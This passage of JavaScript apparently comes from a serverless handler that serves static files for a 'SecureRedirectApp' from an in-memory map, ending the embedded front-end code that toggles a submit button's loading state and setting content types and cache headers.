            btnLoading.style.display = 'inline';
            this.submitBtn.disabled = true;
        } else {
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
            this.submitBtn.disabled = false;
        }
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new SecureRedirectApp();
});`
  };

  const content = files[filename];
  if (!content) {
    return new Response('File not found', { status: 404 });
  }

  const contentType = filename.endsWith('.html') ? 'text/html' :
                     filename.endsWith('.css') ? 'text/css' :
                     filename.endsWith('.js') ? 'application/javascript' : 'text/plain';

  return new Response(content, {
    headers: {
      'Content-Type': contentType,
      'Cache-Control': 'public, max-age=3600',
    },
  });
} 
